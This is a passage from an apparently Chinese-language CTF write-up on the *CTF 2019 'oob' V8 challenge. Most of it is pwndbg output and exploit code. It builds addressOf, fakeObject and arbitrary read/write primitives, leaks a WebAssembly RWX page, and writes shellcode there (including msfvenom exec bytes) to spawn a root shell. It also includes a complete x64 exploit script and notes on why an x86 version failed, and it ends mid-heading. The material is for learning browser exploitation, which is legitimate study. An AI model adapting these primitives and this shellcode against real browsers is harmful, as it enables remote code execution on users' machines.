<span class="number">0x129784b009e1</span> &lt;Map[<span class="number">56</span>]&gt;</span><br><span class="line"> - name: <span class="number">0x129784b04ae1</span> &lt;String[#<span class="number">1</span>]: <span class="number">0</span>&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: <span class="number">144</span></span><br><span class="line"> - formal_parameter_count: <span class="number">0</span></span><br><span class="line"> - expected_nof_properties: <span class="number">0</span></span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: <span class="number">0x05b5f06a1b01</span> &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - <span class="built_in">code</span> (from data): <span class="number">0x027534f82001</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: <span class="number">-1</span></span><br><span class="line"> - start position: <span class="number">-1</span></span><br><span class="line"> - end position: <span class="number">-1</span></span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: <span class="number">0x129784b00c61</span> &lt;ScopeInfo[<span class="number">0</span>]&gt;</span><br><span class="line"> - length: <span class="number">0</span></span><br><span class="line"> - feedback_metadata: <span class="number">0x129784b02a39</span>: [FeedbackMetadata]</span><br><span class="line"> - map: <span class="number">0x129784b01319</span> &lt;Map&gt;</span><br><span class="line"> - slot_count: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job <span class="number">0x05b5f06a1b01</span></span><br><span class="line"><span class="number">0x5b5f06a1b01</span>: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: <span class="number">0x129784b05879</span> &lt;Map[<span class="number">40</span>]&gt;</span><br><span class="line"> - wrapper_code: <span class="number">0x027534f82001</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: <span class="number">0x05b5f06a1969</span> &lt;Instance map = <span class="number">0x2b1b4a09789</span>&gt;</span><br><span class="line"> - function_index: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x05b5f06a1969</span></span><br><span class="line"><span class="number">0x5b5f06a1969</span>: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: <span class="number">0x02b1b4a09789</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x031ac750ac19</span> &lt;Object map = <span class="number">0x2b1b4a0ac79</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: <span class="number">0x031ac75101e1</span> &lt;Module map = <span class="number">0x2b1b4a091e9</span>&gt;</span><br><span class="line"> - exports_object: <span class="number">0x031ac7510451</span> &lt;Object map = <span class="number">0x2b1b4a0adb9</span>&gt;</span><br><span class="line"> - native_context: <span class="number">0x05b5f0681869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - memory_object: <span class="number">0x05b5f06a1a91</span> &lt;Memory map = <span class="number">0x2b1b4a0a189</span>&gt;</span><br><span class="line"> - table <span class="number">0</span>: <span class="number">0x031ac75103e9</span> &lt;Table map = <span class="number">0x2b1b4a09aa9</span>&gt;</span><br><span class="line"> - imported_function_refs: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - managed_native_allocations: <span class="number">0x031ac7510391</span> &lt;Foreign&gt;</span><br><span class="line"> - memory_start: <span class="number">0x7f9336540000</span></span><br><span class="line"> - memory_size: <span class="number">65536</span></span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: <span class="number">0x55977a6fa3f0</span></span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: <span class="number">0x55977a6f9fd0</span></span><br><span class="line"> - indirect_function_table_size: <span class="number">0</span></span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x05b5f06a1968</span>+<span class="number">0x88</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5b5f06a19f0</span> —▸ <span class="number">0x20bf51557000</span> ◂— movabs r10, <span class="number">0x20bf51557260</span> <span class="comment">/* 0x20bf51557260ba49 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5b5f06a19f8</span> —▸ <span class="number">0x31ac75101e1</span> ◂— <span class="number">0x71000002b1b4a091</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x5b5f06a1a00</span> —▸ <span class="number">0x31ac7510451</span> ◂— <span class="number">0x71000002b1b4a0ad</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5b5f06a1a08</span> —▸ <span class="number">0x5b5f0681869</span> ◂— <span class="number">0x129784b00f</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x5b5f06a1a10</span> —▸ <span class="number">0x5b5f06a1a91</span> ◂— <span class="number">0x71000002b1b4a0a1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x5b5f06a1a18</span> —▸ <span class="number">0x129784b004d1</span> ◂— <span class="number">0x129784b005</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x20bf51557000</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x20bf51557000</span>     <span class="number">0x20bf51558000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>       +<span class="number">0x0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据上面的思路，写出泄露RWX内存页起始地址的JS代码如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);<span class="comment">//这里面的偏移在不同版本的v8中可能不同，不过只要在调试的过程中按照Function--&gt;shared_info--&gt;WasmExportedFunctionData--&gt;instance的调用关系确定偏移，最后telescope查看instance的内存就好了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br></pre></td></tr></table></figure><p>gdb结果如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc.js</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread <span class="number">0x7ff37b27e700</span> (LWP <span class="number">2610828</span>)]</span><br><span class="line">[New Thread <span class="number">0x7ff37aa7d700</span> (LWP <span class="number">2610829</span>)]</span><br><span class="line">[New Thread <span class="number">0x7ff37a27c700</span> (LWP <span class="number">2610830</span>)]</span><br><span class="line">[*] leak wasm func addr: <span class="number">0x000033dad08a2018</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a2030</span>: <span class="number">0x000033dad08a1fe1</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a1fe8</span>: <span class="number">0x000033dad08a1fb9</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a1fc8</span>: <span class="number">0x000033dad08a1e21</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a1ea8</span>: <span class="number">0x00002c90fe47c000</span></span><br><span class="line">[*] leak rwx_page_addr: <span class="number">0x00002c90fe47c000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样我们成功的泄露出了rwx内存页的起始地址</p><p>后续只要利用任意地址写write64原语我们的shellcode写入这个rwx页，然后调用wasm函数接口即可触发我们的shellcode了，具体实现如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/* /bin/sh for linux x64</span><br><span class="line"> char shellcode[] = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f \x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;;</span><br><span class="line">*/</span><br><span class="line">var shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">var data_buf = new ArrayBuffer(24);</span><br><span class="line">var data_view = new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</span><br><span class="line"></span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);  //这里写入之前泄露的rwx_page_addr地址</span><br><span class="line">data_view.setFloat64(0, i2f(shellcode[0]), true);</span><br><span class="line">data_view.setFloat64(8, i2f(shellcode[1]), true);</span><br><span class="line">data_view.setFloat64(16, i2f(shellcode[2]), true);</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p><img src="/2021/04/21/starctf2019-oob/image-20210104161032616.png" alt="image-20210104161032616"></p><p>最终运行结果如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/browser_study/v8/v8/v8/out/x64.release# ./d8 exp.js</span><br><span class="line">[*] leak wasm func addr: <span class="number">0x0000388ba6d624a0</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d624b8</span>: <span class="number">0x0000388ba6d62469</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d62470</span>: <span class="number">0x0000388ba6d62441</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d62450</span>: <span class="number">0x0000388ba6d622a9</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d62330</span>: <span class="number">0x00003a7d7595f000</span></span><br><span class="line">[*] leak rwx_page_addr: <span class="number">0x00003a7d7595f000</span></span><br><span class="line">[*] write to : <span class="number">0x000008913e091668</span>: <span class="number">0x00003a7d7595f000</span></span><br><span class="line"><span class="meta"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><h4 id="x64如下"><a href="#x64如下" class="headerlink" title="x64如下"></a>x64如下</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将某个addr强制转换为object对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);</span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + hex(f_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line"><span class="comment">//msfvenom -p linux/x64/exec CMD=whoami -f num</span></span><br><span class="line"><span class="keyword">var</span> shellcode1 = [<span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>, <span class="number">0x07</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x6f</span>, <span class="number">0x61</span>, <span class="number">0x6d</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x05</span>]</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode1.length; i++) &#123;</span><br><span class="line">    data_view.setUint8(i, shellcode1[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure><h4 id="x86如下"><a href="#x86如下" class="headerlink" title="x86如下"></a>x86如下</h4><p>经过个人分析，x86的exp不可构造</p><p>X86构造的过程中，发现在调用oob的过程中，当执行如下语句时</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure><p>泄露obj_array_map时发现泄露的是obj_array_map后面四个字节，内存如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">;obj对象</span><br><span class="line">pwndbg&gt; job 0x294083a1</span><br><span class="line">0x294083a1: [JSArray]</span><br><span class="line"> - map: 0x4ccc17bd &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x47b48a75 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x29408395 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x260c0695 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x28dc00d5 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x29408395 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 0x29408321 &lt;Object map = 0x4ccc55c5&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> ; obj参数对象</span><br><span class="line">pwndbg&gt; job 0x29408395</span><br><span class="line">0x29408395: [FixedArray]</span><br><span class="line"> - map: 0x260c045d &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x29408321 &lt;Object map = 0x4ccc55c5&gt;</span><br><span class="line">pwndbg&gt; telescope 0x29408394</span><br><span class="line">00:0000│  0x29408394 —▸ 0x260c045d ◂— 0x260c00; obj_elements_map</span><br><span class="line">01:0004│  0x29408398 ◂— 0x2  ; length = 1</span><br><span class="line">02:0008│  0x2940839c —▸ 0x29408321 ◂— 0x954ccc55; obj_elements_ptr</span><br><span class="line">03:000c│  0x294083a0 —▸ 0x4ccc17bd ◂— 0x4260c00; 要覆盖的map,也就是obj_map</span><br><span class="line">04:0010│  0x294083a4 —▸ 0x260c0695 ◂— 0x260c04; properties</span><br><span class="line">05:0014│  0x294083a8 —▸ 0x29408395 ◂— 0x2260c04; elements_obj</span><br><span class="line">06:0018│  0x294083ac ◂— 0x2</span><br><span class="line">07:001c│  0x294083b0 —▸ 0x260c0b29 ◂— 0x260c00</span><br></pre></td></tr></table></figure><p>而泄露的内存为<strong>00000000260c0695</strong>，为obj_array_map的后四个字节，而我们通过调试知道，x86里面变量所占用的存储空间也为8个字节，也就是说，我oob函数读写的时候，所操作的内存空间是8个字节，而起始位置，为<strong>0x294083a4</strong>，也就正好是越过obj_map，也就是四个字节进行读写。所以我们没有办法操作obj_array_map。</p><h2 id="8、传统堆利用方式exp构造"><a href="#8、传统堆利用方式exp构造" class="headerlink" 